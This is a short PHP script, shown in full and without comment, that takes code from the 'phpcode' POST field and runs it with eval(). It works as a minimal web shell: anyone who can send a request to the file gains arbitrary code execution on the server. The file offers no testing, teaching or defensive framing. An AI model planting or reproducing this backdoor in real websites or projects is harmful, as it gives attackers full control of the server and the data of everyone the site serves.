<?php
$phpcode = $_POST['phpcode'];
$phpcode = trim($phpcode);
$phpcode = "<?php\n\n{$phpcode}\n\n?>";
eval("?".">$phpcode<?");
?>